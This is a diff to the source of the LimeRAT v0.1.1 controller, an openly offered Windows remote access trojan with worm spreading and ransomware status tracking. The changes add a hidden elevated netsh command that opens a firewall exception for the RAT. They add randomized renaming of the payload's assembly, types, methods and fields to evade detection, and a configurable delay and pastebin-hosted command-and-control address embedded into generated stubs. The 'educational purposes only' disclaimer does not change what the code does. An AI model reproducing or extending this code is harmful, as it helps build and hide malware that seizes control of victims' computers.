@@ -18,7 +18,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                      .. LimeRAT v0.1 ..                      ##
+'##                    .. LimeRAT v0.1.1 ..                      ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -46,7 +46,6 @@ Public Class Main
 
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
-
         Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
 
         Try
@@ -71,7 +70,6 @@ Public Class Main
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Main_Rightclick.Renderer = New MyRenderer()
-
         Dim Client As Net.Sockets.TcpClient = Nothing
         Try
             If GetExternalAddress() = "127.0.0.1" Then
@@ -90,6 +88,19 @@ Public Class Main
             MetroLabel3.ForeColor = Color.Red
             Messages("{ Established! }", "But port " & S_Settings.PORT & " seems to be blocked")
             Try : My.Computer.Audio.Play(Application.StartupPath + "\Misc\Error.wav", AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
+            Dim result As DialogResult = MessageBox.Show("Port " & S_Settings.PORT & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
+            If result = DialogResult.Yes Then
+                Dim process As New Process()
+                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                process.StartInfo.FileName = "cmd.exe"
+                process.StartInfo.UseShellExecute = True
+                process.StartInfo.Verb = "runas"
+                process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
+                process.Start()
+                process.WaitForExit(0)
+                Process.Start(Application.ExecutablePath)
+                End
+            End If
         Finally
             Try : Client.Close() : Catch : End Try
         End Try
@@ -130,6 +141,10 @@ Public Class Main
 #Region "Add to L1"
 
                 Case "info" ' Client Sent me PC name
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
                     SyncLock L1.Items
                         u.L = L1.Items.Add(_Gio.LookupCountryName(u.IP.Split(":")(0)), _Gio.LookupCountryCode(u.IP.Split(":")(0)) & ".png")
                         u.L.Tag = u
@@ -164,6 +179,10 @@ Public Class Main
 #Region "Update L1"
 
                 Case "!P" ' ping
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
                     SyncLock L1.Items
                         u.IsPinged = False
                         u.L.SubItems(PING.Index).Text = u.MS & "ms"
@@ -173,6 +192,10 @@ Public Class Main
                     Exit Select
 
                 Case "!R"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
                     SyncLock L1.Items
                         u.L.SubItems(RANS.Index).Text = A(1).ToString
                         Fix()
@@ -180,6 +203,10 @@ Public Class Main
                     Exit Select
 
                 Case "!SP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
                     SyncLock L1.Items
                         If A(1).ToString.Contains("Spreaded!") Then
                             u.L.BackColor = Color.DarkGreen
@@ -1244,46 +1271,85 @@ Public Class Main
 #Region "Builder"
 
     Private Sub MetroButton1_Click(sender As Object, e As EventArgs) Handles MetroButton1.Click
-
-
-        Dim result As DialogResult
-        result = MessageBox.Show("I, the creator, am not responsible for any actions, and or damages, caused by this software. " & vbNewLine & vbNewLine & "You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only." & vbNewLine & vbNewLine & "This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use." & vbNewLine & vbNewLine & "By pressing ""YES"" button, you automatically agree to the above.", "Lime Worm | Disclaimer" & vbNewLine & vbNewLine, MessageBoxButtons.YesNo)
-        If result = DialogResult.No Then
-            Return
-        ElseIf result = DialogResult.Yes Then
-
-            If (_exe.Text = "") Then
-                _exe.Text = "Wservices.exe"
-            End If
-
-            If _path1.Text = "" Then
-                _path1.Text = "Temp"
-            End If
-
-            If Not _exe.Text.EndsWith(".exe") Then
-                _exe.Text = _exe.Text + ".exe"
-            End If
-
-            If _path2.Text.StartsWith("\") Then
-                _path2.Text = _path2.Text.Replace("\", "")
-            End If
-
-            If Not IO.File.Exists((Application.StartupPath & "\Misc\Stub\Stub.exe")) Then
-                MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
+        Try
+            Dim result As DialogResult
+            result = MessageBox.Show("I, the creator, am not responsible for any actions, and or damages, caused by this software. " & vbNewLine & vbNewLine & "You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only." & vbNewLine & vbNewLine & "This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use." & vbNewLine & vbNewLine & "By pressing ""YES"" button, you automatically agree to the above.", "Lime Worm | Disclaimer" & vbNewLine & vbNewLine, MessageBoxButtons.YesNo)
+            If result = DialogResult.No Then
                 Return
-            ElseIf _pastebin.Text = "" Or Not _pastebin.Text.Contains("http") Then
-                MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
-                Return
-            Else
-                Try
+            ElseIf result = DialogResult.Yes Then
+
+                If radioNET2.Checked Then
+                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe") Then
+                        Shell("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & "", AppWinStyle.Hide, False, -1)
+                        Threading.Thread.Sleep(2000)
+                    Else
+                        MsgBox("Framework 2.0 is not installed!", MsgBoxStyle.Critical, Nothing)
+                        Return
+                    End If
+                Else
+                    If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe") Then
+                        Shell("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & "", AppWinStyle.Hide, False, -1)
+                        Threading.Thread.Sleep(2000)
+                    Else
+                        MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical, Nothing)
+                        Return
+                    End If
+                End If
+
+                If _exe.Text = "" Then
+                    _exe.Text = "Wservices.exe"
+                End If
+
+                If _path1.Text = "" Then
+                    _path1.Text = "Temp"
+                End If
+
+                If Not _exe.Text.EndsWith(".exe") Then
+                    _exe.Text = _exe.Text + ".exe"
+                End If
+
+                '  If _path2.Text.StartsWith("\") Then
+                '  _path2.Text = _path2.Text.Replace("\", "")
+                'End If
+
+                If Not IO.File.Exists(Application.StartupPath & "\Misc\Stub\Stub.exe") Then
+                    MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
+                    Return
+                ElseIf _pastebin.Text = "" Or Not _pastebin.Text.Contains("http") Then
+                    MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
+                    Return
+                Else
+
                     Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Stub\Stub.exe")
+                    If chkRename.Checked Then
+                        definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
+                    End If
                     Dim definition2 As ModuleDefinition
                     For Each definition2 In definition.Modules
+                        If chkRename.Checked Then
+                            definition2.Name = Randomi(rand.Next(6, 20))
+                        End If
                         Dim definition3 As TypeDefinition
                         For Each definition3 In definition2.Types
+                            If chkRename.Checked Then
+                                ' If definition3.Namespace = "Client.Lime" Then
+                                definition3.Namespace = Randomi(rand.Next(6, 20))
+                                definition3.Name = Randomi(rand.Next(6, 20))
+                                '  End If
+                                For Each F In definition3.Fields
+                                    F.Name = Randomi(rand.Next(6, 20))
+                                Next
+                            End If
                             Dim definition4 As MethodDefinition
                             For Each definition4 In definition3.Methods
-                                If (definition4.IsConstructor AndAlso definition4.HasBody) Then
+                                If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
+                                    If chkRename.Checked Then
+                                        definition4.Name = Randomi(rand.Next(6, 20))
+                                        For Each P As ParameterDefinition In definition4.Parameters
+                                            P.Name = Randomi(rand.Next(6, 20))
+                                        Next
+                                    End If
+                                ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                     Dim enumerator As IEnumerator(Of Instruction)
                                     Try
                                         enumerator = definition4.Body.Instructions.GetEnumerator
@@ -1291,6 +1357,9 @@ Public Class Main
                                             Dim current As Instruction = enumerator.Current
                                             If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                                 Dim str As String = current.Operand.ToString
+                                                If (str = "%Delay%") Then
+                                                    current.Operand = _numDelay.Value.ToString
+                                                End If
                                                 If (str = "%Pastebin%") Then
                                                     current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
                                                 End If
@@ -1349,13 +1418,14 @@ Public Class Main
                     End If
                     MsgBox("Your Client Has been Created Successfully", vbInformation, "DONE!")
                     My.Settings.Save()
-                Catch ex1 As Exception
-                    MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
-                    Return
-                End Try
+                    definition.Dispose()
+                    Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
+                End If
             End If
-        End If
-
+        Catch ex1 As Exception
+            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
+            Return
+        End Try
 
     End Sub
 
@@ -1372,7 +1442,7 @@ Public Class Main
     End Sub
 
     Private Sub MetroTile1_Click(sender As Object, e As EventArgs) Handles MetroTile1.Click
-        BackgroundWorker2.RunWorkerAsync()
+        Try : BackgroundWorker2.RunWorkerAsync() : Catch : End Try
     End Sub
 
     Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
@@ -1383,7 +1453,15 @@ Public Class Main
             x = wc.DownloadString(_pastebin.Text)
 
             If rx.IsMatch(x.Split(":")(0)) AndAlso x.Split(":")(1) <= 65535 Then
-                MsgBox("Valid! " + x, MsgBoxStyle.Information)
+                If x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
+                    MsgBox("Valid! " + x, MsgBoxStyle.Information)
+                ElseIf x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
+                    MsgBox("Valid! " + x + Environment.NewLine + "But port doesn't match your current port", MsgBoxStyle.Information)
+                ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
+                    MsgBox("Valid! " + x + Environment.NewLine + "But IP doesn't match your current IP", MsgBoxStyle.Information)
+                ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
+                    MsgBox("Valid! " + x + Environment.NewLine + "But IP and port doesn't match your current settings", MsgBoxStyle.Information)
+                End If
             Else
                 MsgBox("Wrong format", MsgBoxStyle.Critical)
             End If
@@ -1393,20 +1471,24 @@ Public Class Main
     End Sub
 
     Private Sub _icon_CheckedChanged(sender As Object, e As EventArgs) Handles _icon.CheckedChanged
-        If _icon.Checked = True Then
-            Dim o As New OpenFileDialog
-            With o
-                .Filter = "*.ico (*.ico)| *.ico"
-                .InitialDirectory = Application.StartupPath + "\Misc\Icons"
-                .Title = "Select Icon"
-            End With
+        Try
+            If _icon.Checked = True Then
+                Dim o As New OpenFileDialog
+                With o
+                    .Filter = "*.ico (*.ico)| *.ico"
+                    .InitialDirectory = Application.StartupPath + "\Misc\Icons"
+                    .Title = "Select Icon"
+                End With
 
-            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                PictureBox1.ImageLocation = o.FileName
-            Else
-                _icon.Checked = False
+                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                    PictureBox1.ImageLocation = o.FileName
+                Else
+                    _icon.Checked = False
+                End If
             End If
-        End If
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
+        End Try
     End Sub
 
 
